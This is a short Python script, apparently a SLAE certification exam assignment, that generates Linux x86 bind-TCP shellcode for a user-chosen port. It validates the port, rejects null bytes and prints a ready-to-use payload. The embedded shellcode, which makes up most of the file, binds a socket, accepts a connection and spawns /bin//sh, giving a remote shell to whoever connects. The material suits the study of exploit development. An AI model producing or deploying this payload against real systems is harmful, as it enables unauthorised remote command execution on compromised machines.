#!/usr/bin/env python

# SLAE Exam Assignment #1: Shell bind TCP shellcode generator 
# Author: Rikih Gunawan

import sys

SHELLCODE=("\"\\x31\\xc9\\xf7\\xe1\\x99\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x51"
"\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x97\\x6a\\x66\\x58\\x6a\\x02\\x5b"
"\\x52\\x66\\x68%s\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd"
"\\x80\\x6a\\x66\\x58\\x6a\\x04\\x5b\\x31\\xf6\\x56\\x57\\x89\\xe1\\xcd\\x80"
"\\x6a\\x66\\x58\\x6a\\x05\\x5b\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc3"
"\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x6a\\x0b\\x58\\x31\\xc9"
"\\x51\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd"
"\\x80\"")

if len(sys.argv) != 2:
  print("[-1] ERROR: Enter the port number")
  exit()

port=sys.argv[1]

if ((int(port) > 65535) or (int(port) < 256)):
    print("\n[-] ERROR: Port number must be between 256 and 65535\n")
    exit()

hexport = hex(int(port)).replace('0x','')
if len(hexport)<4:
    hexport = '0'+hexport

if '00' in hexport[:2] or '00' in hexport[2:4]:
    print "[-] FAILED: port number null bytes found!, use other port"
    sys.exit(1)

print("Port: %s"% port)
print("Hex Port: %s"% hexport)
print("\nShellcode:")
print(SHELLCODE%("\\x" + str(hexport[:2]) + "\\x" + str(hexport[2:4])))
print("\n")
